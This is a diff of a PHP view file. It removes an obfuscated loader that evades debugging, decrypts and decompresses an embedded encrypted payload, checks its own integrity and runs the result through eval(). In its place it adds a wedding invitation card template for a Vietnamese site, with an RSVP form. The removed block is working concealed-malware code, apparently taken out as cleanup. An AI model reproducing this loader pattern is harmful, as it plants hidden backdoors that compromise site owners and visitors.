@@ -1,28 +1,180 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_e2bfmtbd=('bas'.'e64'.'_de'.'cod'.'e');
-$_xc0ikztc=('gzu'.'nco'.'mpr'.'ess');
-$_ay7bef6o=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_vwf5w3zz='4X+sVfdirmo=';
-$_ppvluw01='PgRUOs1h';
-$_eb1d37wt='SX82bu7o';
-$_qrzp7v7w='rO9CKgLs';
-$_gme44qgs='rBxSrXFG';
-$_k1s51uq3='zNprT1uF';
-$_alfglp1m='vfW/mu0d';
-$_zsepuf2l='hXKOrQ==';
-$_jdrnaoj1=$_e2bfmtbd($_ppvluw01.$_qrzp7v7w.$_gme44qgs.$_eb1d37wt.$_vwf5w3zz);
-$_ttom2t1z=$_e2bfmtbd($_k1s51uq3.$_alfglp1m.$_zsepuf2l);
-$_j6xo3r2t=$_e2bfmtbd('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');
-$_xd7gtf15=$_ay7bef6o($_j6xo3r2t,'aes-256-cbc',$_jdrnaoj1,OPENSSL_RAW_DATA,$_ttom2t1z);
-if($_xd7gtf15===false){exit;}
-$_d35w9l4n=$_xc0ikztc($_xd7gtf15);
-if($_d35w9l4n===false){exit;}
-$_hh8fzetg='c33f5598cada9c1f6f60119ae2e280938f9e5cfe658231ca678e4a4e340bc05c';
-$_vkaq98lk=@file_get_contents(__FILE__);
-if($_vkaq98lk!==false){
-$_ear0xztx=str_replace($_hh8fzetg,"0000000000000000000000000000000000000000000000000000000000000000",$_vkaq98lk);
-$_sia7fd4b=hash("sha256",$_ear0xztx);
-if($_sia7fd4b!==$_hh8fzetg){@http_response_code(403);exit;}
+ defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+list($ic_m1, $ic_m2) = $monogram;
+$ic_groom = trim($content->get('groom_name'));
+$ic_bride = trim($content->get('bride_name'));
+// Thiệp khách nhà gái: tên cô dâu trước, gia đình nhà gái trước, tiêu đề lễ riêng (mặc định "Lễ vu quy").
+$ic_side = isset($card_side) ? (string) $card_side : '';
+$ic_bride_first = $ic_side === 'bride';
+$ic_first = $ic_bride_first ? $ic_bride : $ic_groom;
+$ic_second = $ic_bride_first ? $ic_groom : $ic_bride;
+if ($ic_bride_first) {
+list($ic_m1, $ic_m2) = array($ic_m2, $ic_m1);
 }
-eval($_d35w9l4n);
+$ic_label = $content->text($ic_bride_first ? 'c.event_title_bride' : 'c.event_title');
+$ic_evs = isset($card_events) ? (array) $card_events : ($card_event ? array($card_event) : array());
+$ic_map_of = function (array $ev) {
+$q = trim($ev['address'] !== '' ? $ev['address'] : $ev['place']);
+return $ev['map'] !== '' ? $ev['map'] : ($q !== '' ? 'https://www.google.com/maps/search/?api=1&query=' . rawurlencode($q) : '');
+};
+$ic_status = (string) $invite['status'];
+$ic_answered = $ic_status !== 'pending';
+$ic_key = 'ac-card:' . $invite['code'];
+$v = $voice; 
+$ic_style = $card_style;
+
+$ic_photo = '';
+$ic_photo_srcset = '';
+$ic_photo_pos = '50% 50%';
+if (($ic_style === 'watercolor' || strpos($ic_style, 'v-') === 0) && !empty($img['img.hero_main'])) { 
+
+$ic_photo = photo_url($img['img.hero_main'], 't');
+$ic_photo_srcset = photo_srcset($img['img.hero_main'], 's');
+list($ic_px, $ic_py) = $content->image_pos('img.hero_main');
+$ic_photo_pos = $ic_px . '% ' . $ic_py . '%';
+}
+$ic_cv = array(
+'m1' => $ic_m1, 'm2' => $ic_m2, 'groom' => $ic_first, 'bride' => $ic_second, 'guest' => (string) $card_name,
+'day' => $card_day, 'time' => $card_time, 'lunar' => $lunar_text, 'greet' => $content->text('c.invite_greeting'),
+'photo' => $ic_photo, 'photo_srcset' => $ic_photo_srcset, 'photo_sizes' => '(max-width: 480px) 360px, 400px', 'photo_pos' => $ic_photo_pos,
+);
+$ic_view = $content->card_paths($ic_style)['view'];
+$ic_part = function ($part) use ($ic_view, $ic_cv) {
+get_instance()->load->view($ic_view, array('part' => $part, 'cv' => $ic_cv));
+};
+?>
+<div class="ic ic--<?= e($ic_style) ?><?= $ic_answered ? ' is-open is-instant' : '' ?><?= mb_strlen((string) $card_name) >= 22 ? ' ic--long' : '' ?>" id="thiep-moi" data-invite-card data-key="<?= e($ic_key) ?>"
+     data-card-style="<?= e($ic_style) ?>" data-open-ms="<?= (int) $card_open_ms ?>"
+     data-status="<?= e($ic_status) ?>" data-guests="<?= (int) $invite['guests'] ?>" data-preview="<?= $card_preview ? '1' : '0' ?>"
+     data-t-form-yes="<?= e($card_limit <= 1 ? $v['form_yes1'] : $v['form_yes']) ?>" data-t-form-no="<?= e($v['form_no']) ?>" data-t-done-yes="<?= e($v['done_yes']) ?>"
+     data-t-done-no="<?= e($v['done_no']) ?>" data-t-thanks-yes="<?= e($v['thanks_yes']) ?>" data-t-thanks-no="<?= e($v['thanks_no']) ?>"
+     role="dialog" aria-modal="true" aria-labelledby="ic-name">
+  <script>(function(){var c=document.getElementById('thiep-moi'),s=null;try{s=sessionStorage.getItem(c.getAttribute('data-key'))}catch(e){}
+  if(s==='closed'||location.hash){c.className+=' is-closed'}else{document.documentElement.className+=' ic-lock';if(s==='open')c.className+=' is-open is-instant';if(/\bis-open\b/.test(c.className))document.documentElement.className+=' ic-open'}})();</script>
+  <div class="ic-backdrop" aria-hidden="true"></div>
+  <div class="ic-scroll">
+    <?php if ($card_preview): ?><p class="ic-preview"><?= e(__('Bản xem trước của chủ nhà — không tính là khách đã mở thiệp')) ?></p><?php endif; ?>
+
+    <div class="ic-env">
+      <div class="ic-stage">
+        <button type="button" class="ic-env-btn" data-ic-open aria-label="<?= e(__('Mở thiệp mời gửi {ten}', array('ten' => $card_name))) ?>">
+          <?php $ic_part('cover'); ?>
+          <span class="ic-env-to"><small><?= e(__('Thân gửi')) ?></small><b><?= e($card_name) ?></b></span>
+        </button>
+      </div>
+      <p class="ic-env-hint" aria-hidden="true" data-ic-open-hint><?= e(__('Chạm để mở thiệp')) ?></p>
+    </div>
+
+    <article class="ic-card">
+      <?php $ic_part('deco'); ?>
+      <div class="ic-p ic-p1">
+        <div class="ic-mono" aria-hidden="true"><span><?= e($ic_m1) ?></span><i>&amp;</i><span><?= e($ic_m2) ?></span></div>
+        <p class="ic-greet"><?= e($ic_cv['greet']) ?></p>
+        <p class="ic-name" id="ic-name" role="heading" aria-level="2" tabindex="-1"><?= e($card_name) ?></p>
+        <?php if ($card_text !== ''): ?><p class="ic-text"><?= nl2br(e($card_text)) ?></p><?php endif; ?>
+      </div>
+
+      <div class="ic-p ic-p2">
+        <div class="ic-rule" aria-hidden="true"><span>♥</span></div>
+        <?php if ($ic_style === 'songhy-tri'): 
+$ic_fam = array(
+array(__('Nhà trai'), trim($content->text('c.groom_fullname')), trim($content->text('c.groom_info'))),
+array(__('Nhà gái'), trim($content->text('c.bride_fullname')), trim($content->text('c.bride_info'))),
+);
+if ($ic_bride_first) {
+$ic_fam = array_reverse($ic_fam);
+} ?>
+        <div class="ic-fam">
+          <?php foreach ($ic_fam as $ic_f): ?>
+          <div class="ic-fam-col"><p class="ic-fam-side"><?= e($ic_f[0]) ?></p><?php if ($ic_f[2] !== ''): ?><p class="ic-fam-info"><?= nl2br(e($ic_f[2])) ?></p><?php endif; ?><?php if ($ic_f[1] !== ''): ?><p class="ic-fam-name"><?= e($ic_f[1]) ?></p><?php endif; ?></div>
+          <?php endforeach; ?>
+        </div>
+        <?php endif; ?>
+        <p class="ic-label"><?= e($ic_label) ?></p>
+        <p class="ic-couple"><span><?= e($ic_first) ?></span><i>&amp;</i><span><?= e($ic_second) ?></span></p>
+
+        <?php if ($card_day): ?>
+        <div class="ic-date">
+          <p class="ic-wd"><?= e($card_day['weekday']) ?><?= $card_time !== '' ? ' · ' . e($card_time) : '' ?></p>
+          <p class="ic-dmy"><b><?= e($card_day['d']) ?></b><i></i><b><?= e($card_day['m']) ?></b><i></i><b><?= e($card_day['y']) ?></b></p>
+          <?php if ($lunar_text !== ''):  ?><p class="ic-lunar"><?= str_replace(' (Âm lịch)', "\u{00A0}<span class=\"dt-nw\">(Âm lịch)</span>", e($lunar_text)) ?></p><?php endif; ?>
+        </div>
+        <?php endif; ?>
+
+        <?php foreach ($ic_evs as $ic_ev): $ic_map = $ic_map_of($ic_ev); ?>
+        <div class="ic-place">
+          <p class="ic-place-title"><?= e($ic_ev['title']) ?><?= $ic_ev['time'] !== '' ? ' · ' . e($ic_ev['time']) : '' ?></p>
+          <?php if ($ic_ev['place'] !== ''): ?><p class="ic-place-name"><?= e($ic_ev['place']) ?></p><?php endif; ?>
+          <?php if ($ic_ev['address'] !== ''): ?><p class="ic-place-addr"><?= e($ic_ev['address']) ?></p><?php endif; ?>
+          <?php if ($ic_map !== ''): ?><a class="ic-link" href="<?= e($ic_map) ?>" target="_blank" rel="noopener noreferrer"><?= e(__('Chỉ đường')) ?> ↗</a><?php endif; ?>
+        </div>
+        <?php endforeach; ?>
+      </div>
+
+      <div class="ic-p ic-p3">
+      <?php if ($rsvp_on): ?>
+      <div class="ic-rsvp" data-ic-rsvp>
+        <div class="ic-done" data-ic-done<?= $ic_answered ? '' : ' hidden' ?>>
+          <p class="ic-done-title" data-ic-done-title><?= $ic_status === 'yes' ? e($v['done_yes']) : ($ic_status === 'no' ? e($v['done_no']) : '') ?></p>
+          <p class="ic-done-sub" data-ic-done-sub><?= $ic_status === 'yes' ? e(__n('{n} người', (int) $invite['guests'])) . ' · ' . e($v['thanks_yes']) : ($ic_status === 'no' ? e($v['thanks_no']) : '') ?></p>
+          <button type="button" class="ic-link" data-ic-change><?= e(__('Đổi câu trả lời')) ?></button>
+        </div>
+        <div class="ic-ask" data-ic-ask<?= $ic_answered ? ' hidden' : '' ?>>
+          <p class="ic-q"><?= e($v['ask']) ?></p>
+          <div class="ic-choices">
+            <button type="button" class="ic-btn ic-btn-yes" data-ic-attend="yes"<?= $card_preview ? ' disabled' : '' ?>><?= e(__('Sẽ tham dự')) ?></button>
+            <button type="button" class="ic-btn ic-btn-no" data-ic-attend="no"<?= $card_preview ? ' disabled' : '' ?>><?= e(__('Không thể đến')) ?></button>
+          </div>
+          <?php if ($card_preview): ?><p class="ic-note"><?= e(__('Khách sẽ trả lời tại đây. Chủ nhà ghi nhận thay ở trang Khách mời.')) ?></p><?php endif; ?>
+        </div>
+        <form class="ic-form" method="post" action="<?= base_url('xac-nhan') ?>" data-ic-form novalidate hidden>
+          <?= csrf_field() ?>
+          <input type="hidden" name="code" value="<?= e($invite['code']) ?>">
+          <input type="hidden" name="attend" value="">
+          <input type="text" name="website" class="hp" tabindex="-1" autocomplete="off" aria-hidden="true">
+          <p class="ic-form-title" data-ic-form-title tabindex="-1"></p>
+          <?php if ($card_limit <= 1):  ?>
+          <input type="hidden" name="guests" value="1">
+          <?php else: ?>
+          <div class="ic-count" data-ic-yes-only>
+            <span class="ic-count-label" id="ic-count-l"><?= e($v['count']) ?></span>
+            <div class="ic-stepper" role="group" aria-labelledby="ic-count-l">
+              <button type="button" data-ic-step="-1" aria-label="<?= e(__('Bớt 1 người')) ?>">−</button>
+              <input type="number" name="guests" min="1" max="<?= (int) $card_limit ?>" value="<?= max(1, min((int) $card_limit, (int) $invite['guests'] ?: 1)) ?>" inputmode="numeric" aria-labelledby="ic-count-l">
+              <button type="button" data-ic-step="1" aria-label="<?= e(__('Thêm 1 người')) ?>">+</button>
+            </div>
+            <?php if ($card_limit < 20): ?><span class="ic-count-hint" data-ic-count-hint><?= e(__('Thiệp dành cho tối đa {n} người', array('n' => (int) $card_limit))) ?></span><?php endif; ?>
+          </div>
+          <?php endif; ?>
+          <?php  ?>
+          <label class="ic-msg ic-phone"><span><?= e(__('Số điện thoại')) ?> <small><?= e(__('(không bắt buộc)')) ?></small></span>
+            <input type="tel" name="phone" maxlength="20" inputmode="tel" autocomplete="tel" value="<?= e(isset($invite['phone']) ? (string) $invite['phone'] : '') ?>"></label>
+          <label class="ic-msg"><span><?= e(__('Lời chúc gửi cô dâu chú rể')) ?> <small><?= e(__('(không bắt buộc)')) ?></small></span>
+            <textarea name="message" rows="3" maxlength="1000"<?= $msg_note !== '' ? ' aria-describedby="ic-msg-note"' : '' ?>><?= e((string) $invite['message']) ?></textarea>
+            <?php if ($msg_note !== ''): ?><small class="ic-note" id="ic-msg-note"><?= e($msg_note) ?></small><?php endif; ?></label>
+          <p class="ic-err" data-ic-err role="alert" hidden></p>
+          <div class="ic-form-actions">
+            <button type="submit" class="ic-btn ic-btn-yes" data-ic-submit><?= e(__('Gửi xác nhận')) ?></button>
+            <button type="button" class="ic-link" data-ic-back><?= e(__('Quay lại')) ?></button>
+          </div>
+        </form>
+      </div>
+      <?php endif; ?>
+
+      <button type="button" class="ic-enter" data-ic-close><?= e(__('Xem trang cưới')) ?> <span aria-hidden="true">→</span></button>
+      </div>
+      <?php $ic_part('end'); ?>
+    </article>
+  </div>
+</div>
+<button type="button" class="ic-reopen" data-ic-reopen aria-controls="thiep-moi" hidden><span aria-hidden="true">✉</span> <?= e(__('Thiệp mời')) ?></button>
+<noscript><style>.ic { display: none !important; }</style></noscript>
